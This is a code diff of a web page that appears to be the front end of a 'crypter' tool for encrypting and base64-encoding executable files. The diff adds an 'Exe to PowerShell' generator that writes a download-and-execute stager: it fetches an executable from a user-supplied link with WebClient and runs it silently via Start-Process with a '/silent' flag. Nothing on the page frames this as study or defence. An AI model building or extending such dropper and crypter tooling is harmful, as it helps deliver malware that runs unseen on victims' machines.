@@ -21,7 +21,7 @@
         h1 {
             margin-bottom: 30px;
         }
-        #choose-file-button, #encrypt-button, #crypter-button, #encrypted-file-button {
+        button {
             padding: 15px 30px;
             font-size: 18px;
             border: none;
@@ -58,42 +58,42 @@
         #encrypted-file-button:hover {
             background-color: #00bfff; /* Darker blue on hover */
         }
+        #copy-code-button {
+            background-color: #808080; /* Grey theme */
+            color: white;
+        }
+        #copy-code-button:hover {
+            background-color: #696969; /* Darker grey on hover */
+        }
         input[type="file"] {
             display: none; /* Hides the file input */
         }
-        #file-name {
+        #file-name, #base64-output {
             margin-top: 20px;
             font-size: 18px;
-            color: #ffeb3b; /* Yellow color for file name */
+            color: #ffeb3b; /* Yellow color for file name and output */
+            cursor: pointer; /* Change cursor to indicate clickable */
         }
         #countdown {
             margin-top: 10px;
             font-size: 20px;
             color: #ffeb3b; /* Yellow color for countdown */
         }
-        #base64-container {
+        #base64-container, #ps-container {
             margin-top: 20px;
         }
-        #base64-output {
+        #base64-output, #ps-output {
             border: 1px solid white; 
             padding: 10px; 
             display: inline-block; 
             width: 400px; 
             word-wrap: break-word; 
-            color: #ffeb3b; /* Yellow color for Base64 output */
+            color: #ffeb3b; /* Yellow color for output */
         }
-        #copy-button {
-            padding: 10px 15px;
-            font-size: 16px;
-            margin-left: 10px;
-            cursor: pointer;
-            background-color: #4caf50; /* Green theme */
-            color: white;
-            border: none;
-            border-radius: 5px;
-        }
-        #copy-button:hover {
-            background-color: #45a049; /* Darker green on hover */
+        #ps-input {
+            width: 400px;
+            padding: 10px;
+            margin: 10px 0;
         }
     </style>
 </head>
@@ -110,16 +110,22 @@
 
     <div id="file-name">No file chosen</div>
     
-    <!-- Box to display the Base64 encoded output -->
     <div id="base64-container">
         <div id="base64-output" onclick="copyToClipboard()" title="Click to copy to clipboard">
             Base64 Encoded File: Click to Generate
         </div>
-        <button id="copy-button" onclick="copyToClipboard()">Copy Base64</button>
+        <button id="copy-code-button" onclick="copyFullCode()">Copy Full Code</button>
+    </div>
+
+    <div id="ps-container">
+        <input type="text" id="ps-input" placeholder="Enter link or path for PowerShell code" />
+        <button id="generate-ps-button" onclick="generatePSScript()">Exe to PowerShell</button>
+        <div id="ps-output">PowerShell Code: Click to Generate</div>
     </div>
 
     <script>
         let selectedFile;
+        let base64Output = '';
 
         // Display the name of the chosen file
         document.getElementById("file-input").addEventListener("change", function() {
@@ -175,8 +181,8 @@
                     const reader = new FileReader();
 
                     reader.onload = function(event) {
-                        const base64String = event.target.result.split(',')[1]; // Get Base64 part
-                        document.getElementById("base64-output").textContent = "Base64 Encoded File: " + base64String; // Show Base64 encoded string
+                        base64Output = event.target.result.split(',')[1]; // Get Base64 part
+                        document.getElementById("base64-output").textContent = "Base64 Encoded File: " + base64Output; // Show Base64 encoded string
                     };
 
                     // Read the file as a Data URL (Base64)
@@ -188,12 +194,41 @@
 
         // Function to copy Base64 string to clipboard
         function copyToClipboard() {
-            const base64Output = document.getElementById("base64-output").textContent.split(': ')[1];
             navigator.clipboard.writeText(base64Output).then(() => {
                 alert("Base64 encoded string copied to clipboard!");
             }).catch(err => {
                 console.error('Error copying to clipboard: ', err);
             });
+        }
+
+        // Function to copy full code to clipboard
+        function copyFullCode() {
+            const fullCode = `
+                let selectedFile; 
+                // Other code here...
+                // Base64 Output: ${base64Output}
+            `;
+            navigator.clipboard.writeText(fullCode.trim()).then(() => {
+                alert("Full code copied to clipboard!");
+            }).catch(err => {
+                console.error('Error copying to clipboard: ', err);
+            });
+        }
+
+        // Generate PowerShell script
+        function generatePSScript() {
+            const path = document.getElementById("ps-input").value;
+            if (!path) {
+                alert("Please enter a link or path.");
+                return;
+            }
+
+            const psCode = `
+                $client = New-Object System.Net.WebClient;
+                $client.DownloadFile("${path}", "downloaded.exe");
+                Start-Process "downloaded.exe" -ArgumentList '/silent' -NoNewWindow;
+            `;
+            document.getElementById("ps-output").textContent = "PowerShell Code: " + psCode.trim(); // Show PowerShell code
         }
 
         // Add event listener for the encrypted file button
